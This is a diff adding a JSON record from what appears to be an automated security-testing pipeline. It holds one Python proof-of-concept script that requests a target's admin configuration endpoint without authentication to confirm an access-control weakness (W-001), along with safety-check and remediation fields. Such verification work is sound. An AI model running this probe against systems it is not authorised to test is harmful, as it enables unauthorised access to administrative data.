@@ -1,0 +1,17 @@
+{
+    "scripts": [
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-configuration\"\n\nresponse = requests.get(url)\nif response.status_code == 200 and 'application' in response.text:\n    print('W-001 REPRODUCED: Direct access to admin config succeeded')\n    print('Response snippet:', response.text[:200])\nelse:\n    print('W-001 NOT REPRODUCED: Admin config access failed or invalid response')",
+            "language": "python",
+            "description": "Attempts direct unauthenticated access to the admin configuration endpoint to confirm IDOR vulnerability.",
+            "weakness_id": "W-001",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1068"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Implement proper authentication and authorization checks for all admin endpoints."
+        }
+    ],
+    "rejected": 0
+}
